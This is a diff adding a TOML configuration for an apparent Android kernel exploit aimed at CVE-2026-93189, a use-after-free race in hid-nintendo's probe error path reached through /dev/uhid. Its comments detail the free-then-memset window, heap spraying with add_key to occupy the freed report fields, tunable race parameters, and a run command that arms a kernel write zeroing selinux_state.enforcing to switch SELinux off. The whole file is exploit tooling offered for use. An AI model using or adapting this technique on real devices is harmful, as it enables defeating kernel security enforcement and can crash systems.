@@ -1,0 +1,163 @@
+# entry.joyride@6.1 — CVE-2026-93189, the report fields a failed probe frees.
+#
+# hid-nintendo's probe calls hid_device_io_start() (drivers/hid/hid-nintendo.c)
+# to run its handshake, then fails on our clock when the baud-rate reply is
+# withheld. Its error path calls hid_hw_close()/hid_hw_stop() but never
+# hid_device_io_stop(), so hid_device_probe()'s `if (ret) hid_close_report()`
+# runs with driver_input_lock free and hdev->driver still set: a report sent
+# through /dev/uhid in that instant reaches hid_input_report() unblocked.
+#
+# hid_close_report() frees each report id in turn and only then memsets the
+# whole report_enum, so report_id_hash[] keeps pointing at the freed report
+# until the loop over all 256 ids finishes. That tail is the window. --pad
+# declares further reports at ids above ours so each one is real kfree() work
+# inside it: measured 14-53us bare, 1857us at --pad 200.
+#
+# hid_hw_stop() runs first, and hid_disconnect() frees struct hidraw before it
+# clears hdev->claimed, so a report delivered in between reaches
+# hidraw_report_event() and walks dev->list on the freed object -- which for
+# kmalloc-128 is exactly where SLUB wrote the free pointer. That fault comes
+# before the field window, so the run holds the device's own hidraw node open
+# (drop_ref() skips the kfree while hidraw->open is non-zero) rather than
+# racing it. --no-hold-hidraw turns that off.
+#
+# Root, because the shot checks itself: it resolves the field addresses while
+# the device still holds them and reads them back afterwards. No reboot -- the
+# sequence leaves no per-boot state behind, but a landed write can panic, and
+# a panic ends whatever root the operator supplied (this stage does not
+# re-obtain it).
+schema = 1
+kind   = "entry"
+id     = "entry.joyride@6.1"
+cve    = "CVE-2026-93189"
+kmi    = ["android14-6.1"]
+composed = false
+status   = "Resolves the freed fields, occupies them from the freeing processor, pumps reports at the free-then-memset window and arms one write. Occupancy is reached; no report has yet walked an occupied field."
+
+[build]
+form    = "static-exe"
+entry   = "main"
+sources = ["cves/cve-2026-93189-joyride/joyride.c",
+           "cves/lib/trigger/uhid.c",
+           "cves/lib/trigger/hidraw.c",
+           "cves/lib/trigger/hid_rdesc.c",
+           "cves/lib/trace/window_gate.c",
+           "cves/lib/trace/fnprobe.c",
+           "cves/lib/spray/keyspray.c",
+           "cves/lib/rw/kprobe_read.c"]
+includes = []
+depends  = ["cves/lib/trigger/uhid.h", "cves/lib/trigger/hidraw.h",
+            "cves/lib/trigger/hid_rdesc.h", "cves/lib/trace/window_gate.h",
+            "cves/lib/base/knobs.h", "cves/lib/trace/fnprobe.h",
+            "cves/lib/spray/keyspray.h", "cves/lib/rw/kprobe_read.h",
+            "cves/lib/base/clock.h", "cves/lib/base/cpu.h",
+            "cves/lib/base/outcome.h", "cves/lib/trigger/pump.h",
+            "cves/lib/kaslr/kaslr_tracefs.h", "cves/lib/root/selinux_state.h"]
+defines  = []
+cflags   = ["-std=gnu17", "@OPT@", "-static", "-pthread", "-Werror"]
+opt      = ["-O2", "-g0"]
+ldflags  = []
+output   = "cve-2026-93189-joyride"
+uses_target_header = false
+
+[invoke]
+kind = "device-exec"
+artifact_source = "build"
+dest = "/data/local/tmp/cve93189-joyride"
+mode = "755"
+# --verify is what root buys: the field addresses, resolved while the device
+# still holds its report table, and the readback that says how many of the
+# freed objects the spray owns. --fields 8 keeps the number of independently
+# risky objects per shot small. --spray-max 3000 with the realtime duty cycle
+# is what reaches occupancy (measured: 39-46 of 64 fields carry our bytes at
+# this setting). --pump sends continuously through the window instead of
+# waiting for a userspace-visible event, which is structurally later than the
+# in-kernel free. --live 1 --target selinux arms one write at
+# selinux_state.enforcing: a global, KASLR-relative address needing no
+# per-process leak, whose result userspace reads straight from
+# /sys/fs/selinux/enforce instead of through another kernel read. The pump
+# byte is forced to 0 for this target, because the byte written has to BE
+# zero -- the marker byte would set the bool true and change nothing.
+#
+# --spray-burst is also the size of the first burst placed inside the window,
+# before any report is sent: it has to cover the fields the free released, or
+# the walk reads SLUB's bookkeeping instead. --pad-fields widens the window by
+# giving each padding report more kfree() work in its tail.
+#
+# The pump stops on the kernel's own signal, not on a clock: drop_ref() clears
+# hidraw->exist and wakes hidraw->wait inside hid_disconnect(), which
+# hidraw_poll() reports as EPOLLERR|EPOLLHUP on the descriptor this run holds,
+# ahead of hid_close_report(). It resumes once the spray has claimed the freed
+# fields. Between those two points the fields are free and unclaimed, and a
+# report walking one reads SLUB's bookkeeping rather than ours.
+command = "cd @DEV_TMP@; @KASLR_ENV@@DEV_ENTRY@ --verify --live 1 --target selinux --spray-max 3000 --spray-rt-us 20 > @DEV_LOG@ 2>&1"
+# A base the runner replays for this boot is used in place of the tracefs
+# leak; without one the run leaks its own. The token also carries --tunable.
+accepts_base = true
+# Runs as root for tracefs: kprobe_events, the event enables and kptr_restrict.
+# The trigger itself needs only group 3011.
+needs_root = true
+
+# Swept per shot with --tunable, so a parameter search runs through the runner
+# instead of an ad-hoc loop. The binding constraint is time: add_key costs
+# ~27us, and the window closes somewhere between 263us and 1951us after the
+# gate (measured either side), so JOY_BURST buys occupancy out of the same
+# budget the send needs. Fewer targets (JOY_FIELDS) is the cheaper lever.
+[tunables]
+JOY_FIELDS     = { type = "int", min = 1, max = 64, help = "field objects the free releases, and the number report->maxfield makes hid_process_report() walk. The write goes through one field (report_count=1), so anything above 1 adds faulting chances without adding reach, and splits a fixed burst across more targets. Raise it only to measure occupancy, never to land the write." }
+JOY_BURST      = { type = "int", min = 1, max = 512, help = "placements made inside the window before the first report is sent" }
+JOY_PAD        = { type = "int", min = 0, max = 222, help = "padding reports declared above ours; each is kfree() work in the window's tail" }
+JOY_PAD_FIELDS = { type = "int", min = 1, max = 16, help = "fields per padding report; widens the window at the cost of descriptor bytes" }
+JOY_SENDS      = { type = "int", min = 0, max = 256, help = "reports sent from the spray thread once the fields are claimed. 0 measures occupancy without walking anything, which is the only way to read the reclaim without risking the panic that a lost race causes." }
+
+JOY_SPRAY_CPU  = { type = "int", min = 0, max = 7, help = "processor the spray and its in-window sends run on. Must differ from the one the device is created on, where the probe kworker runs hid_close_report(): on a shared processor the two never overlap and every send arrives after the free." }
+
+[markers]
+# The write landed: /sys/fs/selinux/enforce reads 0 from userspace, with no
+# kernel read in the loop. LIVE_WRITE_CONFIRMED, the readback of the target
+# word itself, stays diagnostic rather than the pass condition.
+pass = 'SELINUX_WRITE_CONFIRMED'
+# hid-nintendo did not take the device.
+gate_fail = 'NO_BIND'
+restore_pass = 'JOYRIDE_NO_SUCH_RESTORE_PASS'
+restore_bad  = 'JOYRIDE_NO_SUCH_RESTORE_BAD'
+heartbeat    = 'JOYRIDE_NO_SUCH_HEARTBEAT seq=[0-9]+'
+# Field resolution, the kernel's own idea of the report, occupancy, and how
+# many of the occupied fields a report actually walked.
+diag       = '(BASELINE_[A-Z_]+.*|FIELDS .*|REPORT_DEBUG .*|FIELD_BATCH .*|FIELD_CHECK .*|SPRAY .*|RSPRAY .*|PUMP.*|GUN_.*|LIVE_[A-Z_]+.*|KASLR_[A-Z_]+.*|SELINUX_[A-Z_]+.*|timeline ms: .*|NO_TIMED_FAILURE|NO_UNWIND .*|VERIFY_[A-Z_]+|SPRAY_[A-Z_]+)'
+diag_count = 'walked=[0-9]+'
+
+# Exit status -> outcome; markers win over it.
+#   1 ran, no write confirmed           2 no uhid, no tracefs, no bind, or
+#                                         SELinux already permissive, which
+#                                         would make the pass marker true
+#                                         before the run started
+#   3 setup failed before anything ran  4 bad command line
+[exit_map]
+"1" = "MISS"
+"2" = "PRECONDITION_FAIL"
+"3" = "REFUSED"
+"4" = "REFUSED"
+
+[properties]
+retry_safe  = false
+panic_risk  = { pre_slide = "high", post_slide = "high" }
+destructive = ["kprobe_events", "kptr_restrict",
+               "continuous reports through the free window -- a landed one can dereference an unsprayed, reoccupied report struct",
+               "leaked hid_device/report/uhid state, permanent until reboot"]
+restores    = ["lib_fnprobe_clear"]
+
+# Reaches a measurement, not a capability.
+[provides]
+caps  = []
+field = ''
+label = ""
+
+# No reboot: the experiment wants the boot that already has root, held across
+# every shot. A panic ends that root and the runner does not re-obtain it.
+[[setup]]
+reboot = false
+command = "echo joyride-setup uid=$(id -u) kernel=$(uname -r) uhid=$([ -c /dev/uhid ] && echo present || echo absent) cpus=$(grep -c ^processor /proc/cpuinfo)"
+needs_root = true
+once_per_boot = true
+description = "record that a root shell answers on this boot, that /dev/uhid exists, and the CPU count the pump will spread across"
